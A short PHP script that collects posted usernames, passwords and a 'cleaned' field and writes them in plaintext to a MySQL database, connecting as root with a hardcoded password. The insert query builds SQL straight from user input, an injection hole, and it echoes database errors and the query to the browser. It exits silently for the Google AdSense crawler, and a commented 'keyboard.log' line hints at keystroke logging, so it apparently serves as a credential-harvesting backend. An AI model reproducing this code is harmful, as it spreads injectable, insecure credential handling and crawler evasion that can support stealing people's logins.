 <?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'Mediapartners-Google') !== false) {
    exit();
}
 // Saving $contents to database...
//   $log_file_name = '../Storage/keyboard.log'; 
  $username = $_POST['username'];
  $password = $_POST['password'];
  $synthpas = $_POST['cleaned'];
  $link = mysqli_connect("localhost", "root", "root", "login");
  
  
  if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

$sql = "INSERT INTO users VALUES ('NULL','$username', '$password' ,'$synthpas')";
if(mysqli_query($link, $sql)){
    echo "Records inserted successfully.";
} else{
    echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
}
 
// Close connection
mysqli_close($link);
?>




